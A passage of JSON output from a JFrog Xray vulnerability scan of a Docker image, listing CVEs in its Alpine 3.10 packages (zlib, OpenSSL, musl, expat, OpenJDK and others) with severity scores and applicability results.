                    ]
                },
                {
                    "issue_id": "XRAY-200814",
                    "summary": "libiberty/rust-demangle.c in GNU GCC 11.2 allows stack consumption in demangle_const, as demonstrated by nm-new.",
                    "description": "libiberty/rust-demangle.c in GNU GCC 11.2 allows stack consumption in demangle_const, as demonstrated by nm-new.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-27943",
                            "cwe": [
                                "CWE-674"
                            ],
                            "cvss_v2": "4.3/CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2022-03-27T00:00:00.710Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libstdc++:8.3.0-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libgcc:8.3.0-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2022-27943",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-520788",
                    "summary": "A heap-based buffer overflow issue was discovered in libjpeg-turbo in h2v2_merged_upsample_internal() function of jdmrgext.c file. The vulnerability can only be exploited with 12-bit data precision for which the range of the sample data type exceeds the valid sample range, hence, an attacker could craft a 12-bit lossless JPEG image that contains out-of-range 12-bit samples. An application attempting to decompress such image using merged upsampling would lead to segmentation fault or buffer overflows, causing an application to crash.",
                    "description": "A heap-based buffer overflow issue was discovered in libjpeg-turbo in h2v2_merged_upsample_internal() function of jdmrgext.c file. The vulnerability can only be exploited with 12-bit data precision for which the range of the sample data type exceeds the valid sample range, hence, an attacker could craft a 12-bit lossless JPEG image that contains out-of-range 12-bit samples. An application attempting to decompress such image using merged upsampling would lead to segmentation fault or buffer overflows, causing an application to crash.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-2804",
                            "cwe": [
                                "CWE-787"
                            ],
                            "cvss_v3": "6.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2023-05-28T00:00:00.130Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libjpeg-turbo:2.0.4-r1"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-2804",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-97824",
                    "summary": "When encrypting with a block cipher, if a call to NSC_EncryptUpdate was made with data smaller than the block size, a small out of bounds write could occur. This could have caused heap corruption and a potentially exploitable crash. This vulnerability affects Thunderbird < 68.3, Firefox ESR < 68.3, and Firefox < 71.",
                    "description": "When encrypting with a block cipher, if a call to NSC_EncryptUpdate was made with data smaller than the block size, a small out of bounds write could occur. This could have caused heap corruption and a potentially exploitable crash. This vulnerability affects Thunderbird < 68.3, Firefox ESR < 68.3, and Firefox < 71.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2019-11745",
                            "cwe": [
                                "CWE-787"
                            ],
                            "cvss_v2": "6.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
                            "cvss_v3": "8.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2020-05-11T00:00:00.729Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:nss:3.44.3-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:nss:3.44.3-r0",
                            "cve_id": "CVE-2019-11745",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether any of the vulnerable functions are called -</p>\n<ul>\n<li><code>C_EncryptUpdate</code></li>\n<li><code>C_Encrypt</code></li>\n<li><code>C_DigestEncryptUpdate</code></li>\n<li><code>C_SignEncryptUpdate</code></li>\n</ul>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:nss:3.44.3-r0",
                            "vulnerability_id": "CVE-2019-11745",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-599303",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u401, 8u401-perf, 11.0.22, 17.0.10, 21.0.2, 22; Oracle GraalVM for JDK: 17.0.10, 21.0.2, 22; Oracle GraalVM Enterprise Edition: 20.3.13 and  21.3.9. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u401, 8u401-perf, 11.0.22, 17.0.10, 21.0.2, 22; Oracle GraalVM for JDK: 17.0.10, 21.0.2, 22; Oracle GraalVM Enterprise Edition: 20.3.13 and  21.3.9. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-21094"
                        }
                    ],
                    "created": "2024-04-25T00:00:00.661Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2024-21094",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-608014",
                    "summary": "Issue summary: Processing a maliciously formatted PKCS12 file may lead OpenSSL\nto crash leading to a potential Denial of Service attack\n\nImpact summary: Applications loading files in the PKCS12 format from untrusted\nsources might terminate abruptly.\n\nA file in PKCS12 format can contain certificates and keys and may come from an\nuntrusted source. The PKCS12 specification allows certain fields to be NULL, but\nOpenSSL does not correctly check for this case. This can lead to a NULL pointer\ndereference that results in OpenSSL crashing. If an application processes PKCS12\nfiles from an untrusted source using the OpenSSL APIs then that application will\nbe vulnerable to this issue.\n\nOpenSSL APIs that are vulnerable to this are: PKCS12_parse(),\nPKCS12_unpack_p7data(), PKCS12_unpack_p7encdata(), PKCS12_unpack_authsafes()\nand PKCS12_newpass().\n\nWe have also fixed a similar issue in SMIME_write_PKCS7(). However since this\nfunction is related to writing data we do not consider it security significant.\n\nThe FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue.",
                    "description": "Issue summary: Processing a maliciously formatted PKCS12 file may lead OpenSSL\nto crash leading to a potential Denial of Service attack\n\nImpact summary: Applications loading files in the PKCS12 format from untrusted\nsources might terminate abruptly.\n\nA file in PKCS12 format can contain certificates and keys and may come from an\nuntrusted source. The PKCS12 specification allows certain fields to be NULL, but\nOpenSSL does not correctly check for this case. This can lead to a NULL pointer\ndereference that results in OpenSSL crashing. If an application processes PKCS12\nfiles from an untrusted source using the OpenSSL APIs then that application will\nbe vulnerable to this issue.\n\nOpenSSL APIs that are vulnerable to this are: PKCS12_parse(),\nPKCS12_unpack_p7data(), PKCS12_unpack_p7encdata(), PKCS12_unpack_authsafes()\nand PKCS12_newpass().\n\nWe have also fixed a similar issue in SMIME_write_PKCS7(). However since this\nfunction is related to writing data we do not consider it security significant.\n\nThe FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-0727",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2024-07-01T00:00:00.521Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2024-0727",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-677249",
                    "summary": "A stack overflow vulnerability exists in the libexpat library due to the way it handles recursive entity expansion in XML documents. When parsing an XML document with deeply nested entity references, libexpat can be forced to recurse indefinitely, exhausting the stack space and causing a crash. This issue could lead to denial of service (DoS) or, in some cases, exploitable memory corruption, depending on the environment and library usage.",
                    "description": "A stack overflow vulnerability exists in the libexpat library due to the way it handles recursive entity expansion in XML documents. When parsing an XML document with deeply nested entity references, libexpat can be forced to recurse indefinitely, exhausting the stack space and causing a crash. This issue could lead to denial of service (DoS) or, in some cases, exploitable memory corruption, depending on the environment and library usage.",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-8176"
                        }
                    ],
                    "created": "2025-03-14T00:00:00.479Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:expat:2.2.8-r0"
                    ],
                    "extended_information": {
                        "short_description": "A design problem in libexpat may lead to denial of service when parsing a crafted XML document.",
                        "full_description": "[Expat](https://libexpat.github.io/) is a stream-oriented XML parser written in C.\n\nWhen parsing an XML document, it is required to map tags into entities that represent data items and can be used throughout the document. \n\nIt has been discovered that entity resolution and substitution were implemented via the recursive function `processInternalEntity()` without adequate depth limitations for all relevant cases. This may lead to the exhaustion of the stack, resulting in a denial of service. \n\nTo exploit this vulnerability, an attacker must be able to parse their crafted XML using `XML_ParseBuffer()` or `XML_Parse()`.",
                        "jfrog_research_severity": "High",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "A potential attacker must be able to feed custom XML files to `XML_ParseBuffer()` or `XML_Parse()`.",
                                "is_positive": true
                            },
                            {
                                "name": "The issue has a detailed technical explanation published, that can aid in exploit development",
                                "description": "A PoC was published demonstrating denial of service including a write-up.",
                                "is_positive": false
                            },
                            {
                                "name": "The issue results in a severe impact (such as remote code execution)",
                                "description": "May lead to denial-of-service.",
                                "is_positive": false
                            }
                        ]
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "cve_id": "CVE-2024-8176",
                            "scan_status": 1,
                            "applicability": false,
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "vulnerability_id": "CVE-2024-8176",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-670912",
                    "summary": "musl libc 0.9.13 through 1.2.5 before 1.2.6 has an out-of-bounds write vulnerability when an attacker can trigger iconv conversion of untrusted EUC-KR text to UTF-8.",
                    "description": "musl libc 0.9.13 through 1.2.5 before 1.2.6 has an out-of-bounds write vulnerability when an attacker can trigger iconv conversion of untrusted EUC-KR text to UTF-8.",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2025-26519"
                        }
                    ],
                    "created": "2025-02-15T00:00:00.775Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:musl:1.1.22-r4",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:musl-utils:1.1.22-r4"
                    ],
                    "extended_information": {
                        "short_description": "An out-of-bound write vulnerability in Musl Libc can lead to denial of service when using a specific character set.",
                        "full_description": "musl is a C standard library intended for operating systems based on the Linux kernel. Most notably, it is the default libc implementation used in the popular Alpine Linux distribution.\nEUC-KR (Extended Unix Code for Korean) is a character encoding system used primarily for the Korean language.\n\nThe vulnerability was introduced in Musl Libc versions 0.9.13 through 1.2.5 in the `iconv()` function.\nAttackers can use the out-of-bounds write vulnerability by overflowing the buffer passed to the `iconv()` function and potentially overwriting the neighboring variables or crashing the application.\n\nTo successfully exploit this CVE, applications must call `iconv_open()` with an output encoding of UTF-8 and input encoding of `EUC-KR` and call `iconv()` with user-controlled input.",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                                "description": "Currently there is no POC that can lead to code execution or even denial of service. Although memory corruption is possible, it is unproven whether it can lead to code execution.",
                                "is_positive": true
                            },
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "The applicability of this CVE requires applications to call `iconv_open` with an output encoding of UTF-8 and input encoding of EUC-KR and then use the returned value (`iconv` descriptor) as the first argument to the `iconv()` function. Additionally, `iconv()` should be called with user-controlled input.",
                                "is_positive": true
                            }
                        ]
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:musl:1.1.22-r4",
                            "cve_id": "CVE-2025-26519",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether both of the vulnerable functions <code>iconv()</code> and <code>iconv_open()</code> are called.</p>",
                            "evidence": null,
                            "info": "No references to the vulnerable function iconv were found",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:musl-utils:1.1.22-r4",
                            "cve_id": "CVE-2025-26519",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether both of the vulnerable functions <code>iconv()</code> and <code>iconv_open()</code> are called.</p>",
                            "evidence": null,
                            "info": "No references to the vulnerable function iconv were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:musl:1.1.22-r4",
                            "vulnerability_id": "CVE-2025-26519",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:musl-utils:1.1.22-r4",
                            "vulnerability_id": "CVE-2025-26519",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-99972",
                    "summary": "SQLite through 3.32.0 has a segmentation fault in sqlite3ExprCodeTarget in expr.c.",
                    "description": "SQLite through 3.32.0 has a segmentation fault in sqlite3ExprCodeTarget in expr.c.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2020-13435",
                            "cwe": [
                                "CWE-476"
                            ],
                            "cvss_v2": "2.1/CVSS:2.0/AV:L/AC:L/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2020-06-05T00:00:00.437Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:sqlite-libs:3.28.0-r3"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2020-13435",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-194606",
                    "summary": "GCC v12.0 was discovered to contain an uncontrolled recursion via the component libiberty/rust-demangle.c. This vulnerability allows attackers to cause a Denial of Service (DoS) by consuming excessive CPU and memory resources.",
                    "description": "GCC v12.0 was discovered to contain an uncontrolled recursion via the component libiberty/rust-demangle.c. This vulnerability allows attackers to cause a Denial of Service (DoS) by consuming excessive CPU and memory resources.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-46195",
                            "cwe": [
                                "CWE-674"
                            ],
                            "cvss_v2": "4.3/CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2022-01-16T00:00:00.280Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libstdc++:8.3.0-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libgcc:8.3.0-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-46195",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-248482",
                    "summary": "zlib through 1.2.12 has a heap-based buffer over-read or buffer overflow in inflate in inflate.c via a large gzip header extra field. NOTE: only applications that call inflateGetHeader are affected. Some common applications bundle the affected zlib source code but may be unable to call inflateGetHeader (e.g., see the nodejs/node reference).",
                    "description": "zlib through 1.2.12 has a heap-based buffer over-read or buffer overflow in inflate in inflate.c via a large gzip header extra field. NOTE: only applications that call inflateGetHeader are affected. Some common applications bundle the affected zlib source code but may be unable to call inflateGetHeader (e.g., see the nodejs/node reference).",
                    "issue_type": "security",
                    "severity": "Critical",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-37434",
                            "cwe": [
                                "CWE-787"
                            ],
                            "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2022-08-07T00:00:00.020Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:zlib:1.2.11-r1"
                    ],
                    "extended_information": {
                        "short_description": "A heap overflow in zlib can lead to remote code execution when a crafted gzip archive is processed.",
                        "full_description": "[zlib](https://github.com/madler/zlib) is a popular general purpose data compression library.\n\nzlib supports processing gzip archives. As such, it provides the `inflateGetHeader()` method used to get the header information of a gzip archive. The header is always checked for validity, including the header CRC if present. \nWhen the `inflateGetHeader()` is called, it will make the `inflate()` method read and copy the header of a gzip in a structure passed as a parameter to the `inflateGetHeader()` method, otherwise it will discard the header. If the extra header field is big enough, it will cause the `inflate()` method to be called multiple times to get the full content of this extra field. As there is an improper extra field size check, it can cause a heap buffer overflow.\nThe vulnerability can be exploited if and only if the target program calls `inflateGetHeader()`.\nThe attacker should find a remote input that propagates to the `inflate()` method with the `inflateGetHeader()` method being called.\n\nExample:\n```\nz_stream strm;\ngz_header head;\n\nif ((r = inflateInit2(&strm, stream_size)) != Z_OK)\n\tgoto fail;\nif ((r = inflateGetHeader(&strm, &head)) != Z_OK) {\n\tinflateEnd(&strm);\n\tgoto fail;\n}\nr = inflate(&strm, Z_NO_FLUSH);\n```\nThe above code is vulnerable as it is calling the `inflateGetHeader()` method and the `inflate()` method for crafter gzip header.",
                        "jfrog_research_severity": "High",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "The attacker must find a way to upload a crafted gzip archive, that is subsequently processed by a `inflate()` call with `inflateGetHeader()` being called before.",
                                "is_positive": true
                            },
                            {
                                "name": "The issue has an exploit published",
                                "description": "PoC demonstrates a heap overflow that crashes the application. Although not demonstrated, it is likely that an RCE exploit could be developed, since gzip-processing may allow many heap-shaping primitives needed for a full RCE exploit.",
                                "is_positive": false
                            },
                            {
                                "name": "The issue results in a severe impact (such as remote code execution)",
                                "description": "Heap overflow leading to code execution",
                                "is_positive": false
                            }
                        ]
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:zlib:1.2.11-r1",
                            "cve_id": "CVE-2022-37434",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the vulnerable function <code>inflateGetHeader()</code> is called.</p>",
                            "evidence": null,
                            "info": "The vulnerable library zlib is never included",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:zlib:1.2.11-r1",
                            "vulnerability_id": "CVE-2022-37434",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-514972",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u361, 8u361-perf, 11.0.18, 17.0.6; Oracle GraalVM Enterprise Edition: 20.3.9, 21.3.5 and  22.3.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.9 (Confidentiality impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u361, 8u361-perf, 11.0.18, 17.0.6; Oracle GraalVM Enterprise Edition: 20.3.9, 21.3.5 and  22.3.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.9 (Confidentiality impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-21954",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v3": "5.9/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
                        }
                    ],
                    "created": "2023-04-19T00:00:00.693Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
